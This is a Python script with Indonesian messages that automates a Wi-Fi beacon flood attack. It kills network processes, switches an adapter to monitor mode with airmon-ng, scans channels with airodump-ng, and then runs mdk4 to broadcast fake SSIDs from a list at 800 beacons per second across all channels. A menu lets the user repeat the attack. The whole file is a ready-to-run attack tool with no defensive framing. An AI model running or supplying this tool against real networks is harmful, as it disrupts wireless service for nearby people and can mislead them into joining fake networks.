#!/usr/bin/env python3
import csv
import glob
import os
import random
import re
import subprocess
import sys
import tempfile
import time
import signal
import threading

GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
YELLOW = "\033[93m"
RESET = "\033[0m"
BOLD = "\033[1m"

# Konfigurasi
BEACON_SPEED = 800  # Packet per detik (lebih agresif)
CHANNEL_HOPPING = True  # Hopping otomatis
MAX_SSID_WARNING = 800  # Peringatan jika SSID terlalu banyak


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def glitch_text(text):
    colors = [GREEN, RED, CYAN, MAGENTA, YELLOW]
    return f"{BOLD}{random.choice(colors)}{text}{RESET}"


def glitch_print(text, delay=0.015, rounds=6):
    """Efek glitch cepat"""
    n = len(text)
    settled = [False] * n
    colors = [GREEN, RED, CYAN, MAGENTA, YELLOW]
    glitch_chars = "!@#$%^&*<>/\\|~?01"

    for r in range(rounds):
        settle_ratio = (r + 1) / rounds
        line = ""
        for i, c in enumerate(text):
            if c == " ":
                line += " "
                continue
            if settled[i]:
                line += f"{GREEN}{c}{RESET}"
                continue
            if random.random() < settle_ratio * 0.5:
                settled[i] = True
                line += f"{GREEN}{c}{RESET}"
            else:
                line += f"{random.choice(colors)}{random.choice(glitch_chars)}{RESET}"
        sys.stdout.write("\r" + line + "\033[K")
        sys.stdout.flush()
        time.sleep(delay)

    for _ in range(2):
        flash = f"{BOLD}{random.choice(colors)}{text}{RESET}"
        sys.stdout.write("\r" + flash + "\033[K")
        sys.stdout.flush()
        time.sleep(0.04)

    sys.stdout.write("\r" + f"{GREEN}{text}{RESET}" + "\033[K" + "\n")
    sys.stdout.flush()


def get_wireless_interfaces():
    output = subprocess.run(["ip", "link"], capture_output=True, text=True).stdout
    interfaces = []
    for line in output.splitlines():
        m = re.match(r"^\d+:\s+(\S+):", line)
        if m:
            name = m.group(1)
            if name == "lo":
                continue
            interfaces.append(name)
    return interfaces


def get_monitor_interface_name(adapter, output):
    current_ifaces = get_wireless_interfaces()
    for iface in current_ifaces:
        if iface != adapter and iface.endswith("mon"):
            return iface

    match = re.search(r"\[(?:phy\d+)\]([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    match = re.search(r"\b([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    try:
        iw_output = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
        for line in iw_output.splitlines():
            m = re.search(r"\bInterface\s+(\S+)", line)
            if m:
                iface = m.group(1)
                if iface != adapter and iface.endswith("mon"):
                    return iface
    except FileNotFoundError:
        pass

    return f"{adapter}mon"


def run_command(cmd, description=None, show_output=False):
    if description:
        print(f"\n{CYAN}>{description}{RESET}")

    if show_output:
        print(f"{YELLOW}{' '.join(cmd)}{RESET}")

    result = subprocess.run(cmd, capture_output=True, text=True)
    if show_output:
        if result.stdout:
            print(result.stdout.strip())
        if result.stderr:
            print(result.stderr.strip())

    if result.returncode != 0:
        if not show_output:
            print(f"{RED}Perintah gagal: {' '.join(cmd)}{RESET}")
        return None
    return result


def start_monitor_mode(adapter):
    glitch_print(f"ACTIVATING MONITOR MODE ON {adapter}...")
    run_command(["sudo", "airmon-ng", "check", "kill"], "MEMBERSIHKAN PROSES PENGANGGU", show_output=False)
    result = run_command(["sudo", "airmon-ng", "start", adapter], "MONITOR MODE AKTIF", show_output=False)
    print("")
    if result is None:
        return adapter

    output = (result.stdout or "") + (result.stderr or "")
    monitor_iface = get_monitor_interface_name(adapter, output)
    time.sleep(1)
    print(glitch_text(f"> Interface monitor aktif: {monitor_iface}"))
    print()
    return monitor_iface


def scan_networks(adapter, duration=5):
    """Scan cepat untuk deteksi channel"""
    clear_screen()
    glitch_print("SCANNING CHANNELS...")
    
    temp_dir = tempfile.mkdtemp(prefix="airodump-", dir="/tmp")
    prefix = os.path.join(temp_dir, "scan")
    proc = subprocess.Popen(
        ["sudo", "airodump-ng", "--write", prefix, "--output-format", "csv", adapter],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    try:
        time.sleep(duration)
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

    channels = set()
    for csv_path in sorted(glob.glob(prefix + "-*.csv")):
        with open(csv_path, newline="", encoding="utf-8", errors="ignore") as handle:
            reader = csv.reader(handle)
            for row in reader:
                if len(row) < 14:
                    continue
                channel = row[3].strip()
                if channel.isdigit():
                    channels.add(channel)

    for path in glob.glob(prefix + "-*.csv"):
        try:
            os.remove(path)
        except OSError:
            pass
    try:
        os.rmdir(temp_dir)
    except OSError:
        pass

    return sorted(channels, key=int)


def stop_monitor_mode(monitor_iface):
    clear_screen()
    print(f"\n{CYAN}STOPPING MONITOR MODE...{RESET}")
    
    candidates = [monitor_iface]
    if monitor_iface.endswith("mon"):
        candidates.append(monitor_iface[:-3])
    else:
        candidates.append(f"{monitor_iface}mon")

    for name in candidates:
        result = run_command(["sudo", "airmon-ng", "stop", name], show_output=False)
        if result is not None:
            break

    print(f"{CYAN}RESTARTING NETWORK SERVICES...{RESET}")
    run_command(["sudo", "systemctl", "restart", "NetworkManager"], show_output=False)
    run_command(["sudo", "systemctl", "restart", "wpa_supplicant"], show_output=False)
    print(f"{GREEN}✓ Network services restarted{RESET}")


def select_interface():
    glitch_print("SCANNING INTERFACES...")
    ifaces = get_wireless_interfaces()
    if not ifaces:
        print("Ga ada interface ditemukan.")
        sys.exit(1)

    print(f"\n{BOLD}Pilih interface:{RESET}")
    for idx, name in enumerate(ifaces, start=1):
        print(f"{GREEN}{idx}.{RESET} {name}")

    while True:
        choice = input("\nNomor: ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
            selected = ifaces[int(choice) - 1]
            glitch_print(f"LOCKED: {selected}")
            clear_screen()
            return selected
        print("Input salah, coba lagi.")


def get_ssid_file_path():
    """Mencari file ssid_list.txt di folder ssid-fake"""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    possible_paths = [
        os.path.join(script_dir, "ssid-fake", "ssid_list.txt"),
        os.path.join(script_dir, "ssid_list.txt"),
        os.path.join(os.path.dirname(script_dir), "ssid-fake", "ssid_list.txt"),
    ]
    
    for path in possible_paths:
        if os.path.exists(path):
            return path
    
    print(f"{RED}File ssid_list.txt tidak ditemukan!{RESET}")
    print(f"{YELLOW}Pastikan file ada di: ssid-fake/ssid_list.txt{RESET}")
    return None


def get_ssid_count(filepath):
    """Menghitung jumlah SSID di file"""
    try:
        with open(filepath, 'r') as f:
            return sum(1 for line in f if line.strip())
    except:
        return 0


def show_post_attack_menu(monitor_iface):
    """Menampilkan menu setelah serangan dihentikan"""
    print(f"\n{BOLD}{CYAN}╔══════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{CYAN}║              SERANGAN DIHENTIKAN                 ║{RESET}")
    print(f"{BOLD}{CYAN}╚══════════════════════════════════════════════════╝{RESET}")
    print(f"\n{BOLD}1.{RESET} Attack Again")
    print(f"{BOLD}0.{RESET} Back to Menu")
    print(f"{BOLD}99.{RESET} Exit")
    
    while True:
        try:
            choice = input(f"\n{BOLD}{YELLOW}>> Pilihan: {RESET}").strip()
            
            if choice == "1":
                print(f"\n{GREEN}Memulai ulang serangan...{RESET}")
                stop_monitor_mode(monitor_iface)
                time.sleep(1)
                os.execvp(sys.executable, [sys.executable, __file__])
                
            elif choice == "0":
                print(f"\n{GREEN}Kembali ke menu utama...{RESET}")
                stop_monitor_mode(monitor_iface)
                time.sleep(1)
                
                script_dir = os.path.dirname(os.path.abspath(__file__))
                menu_path = os.path.join(script_dir, "mdk4-menu.py")
                
                if os.path.exists(menu_path):
                    os.execvp(sys.executable, [sys.executable, menu_path])
                else:
                    print(f"{RED}mdk4-menu.py tidak ditemukan!{RESET}")
                    sys.exit(0)
                    
            elif choice == "99":
                print(f"\n{GREEN}Keluar dari program...{RESET}")
                stop_monitor_mode(monitor_iface)
                time.sleep(1)
                print(f"{GREEN}Terima kasih!{RESET}")
                sys.exit(0)
                
            else:
                print(f"{RED}Pilihan tidak valid! Silakan pilih 1, 0, atau 99.{RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Interrupt diterima, keluar...{RESET}")
            stop_monitor_mode(monitor_iface)
            sys.exit(0)


def run_beacon_attack(monitor_iface):
    ssid_file = get_ssid_file_path()
    if not ssid_file:
        print(f"{RED}Gagal menemukan ssid_list.txt. Serangan dibatalkan.{RESET}")
        return

    ssid_count = get_ssid_count(ssid_file)
    
    if ssid_count == 0:
        print(f"{RED}File ssid_list.txt kosong!{RESET}")
        return
    
    print(f"\n{CYAN}📊 SSID Loaded: {ssid_count}{RESET}")
    
    if ssid_count > MAX_SSID_WARNING:
        print(f"{YELLOW}⚠️  SSID: {ssid_count} (disarankan max {MAX_SSID_WARNING}){RESET}")
        confirm = input(f"\n{YELLOW}Lanjutkan? (y/n): {RESET}").strip().lower()
        if confirm != 'y':
            print(f"{RED}Serangan dibatalkan.{RESET}")
            return

    # Build command dengan optimasi
    mdk4_cmd = [
        "sudo",
        "mdk4",
        monitor_iface,
        "b",
        "-f", ssid_file,
        "-w", "a",  # Gunakan semua yang ada
        "-s", str(BEACON_SPEED),
    ]
    
    # Tambahkan channel hopping jika diaktifkan
    if CHANNEL_HOPPING:
        mdk4_cmd.extend(["-c", "h"])

    print(f"\n{RED}{BOLD}🔥 BEACON FLOOD AKTIF! 🔥{RESET}")
    print(f"{CYAN}✓ SSID: {ssid_count} jaringan palsu{RESET}")
    print(f"{CYAN}✓ Speed: {BEACON_SPEED} beacon/detik{RESET}")
    print(f"{CYAN}✓ Channel: {'HOPPING' if CHANNEL_HOPPING else 'FIXED'}{RESET}")
    print(f"\n{YELLOW}Menjalankan MDK4...{RESET}")
    print(f"{CYAN}{' '.join(mdk4_cmd)}{RESET}")
    print(f"\n{BOLD}{GREEN}[!] Tekan Ctrl+C untuk menghentikan{RESET}")
    print(f"{BOLD}{YELLOW}[!] Kartu akan terasa hangat - ini normal{RESET}\n")

    try:
        # Jalankan dengan Popen untuk kontrol lebih baik
        proc = subprocess.Popen(mdk4_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Monitor output
        while True:
            output = proc.stderr.readline()
            if output == '' and proc.poll() is not None:
                break
            if output:
                # Tampilkan hanya informasi penting
                if "SSID:" in output or "AP:" in output or "packets" in output:
                    sys.stdout.write(f"{CYAN}➜ {output}{RESET}")
                    sys.stdout.flush()
        
        if proc.returncode != 0 and proc.returncode != -2:
            print(f"{RED}MDK4 beacon attack gagal dengan kode {proc.returncode}.{RESET}")
            
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}⏹ Serangan dihentikan.{RESET}")
        
    finally:
        if 'proc' in locals() and proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()


def main():
    monitor_iface = None
    
    def signal_handler(sig, frame):
        print(f"\n{YELLOW}Signal received, cleaning up...{RESET}")
        if monitor_iface:
            stop_monitor_mode(monitor_iface)
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    try:
        clear_screen()
        adapter = select_interface()
        monitor_iface = start_monitor_mode(adapter)
        
        # Scan cepat untuk deteksi channel aktif
        channels = scan_networks(monitor_iface, duration=5)
        if channels:
            print(f"{CYAN}📡 Channel aktif terdeteksi: {', '.join(channels)}{RESET}")
            print(f"{CYAN}💡 Mode channel hopping akan menyerang semua channel{RESET}\n")
            time.sleep(1)
        
        # Jalankan serangan
        run_beacon_attack(monitor_iface)
        
        # Cleanup
        print("\nMembersihkan sesi...")
        stop_monitor_mode(monitor_iface)
        
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Keyboard interrupt diterima.{RESET}")
        if monitor_iface:
            stop_monitor_mode(monitor_iface)
        print("Keluar dari program.")
        sys.exit(0)
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")
        if monitor_iface:
            stop_monitor_mode(monitor_iface)
        sys.exit(1)


if __name__ == "__main__":
    main()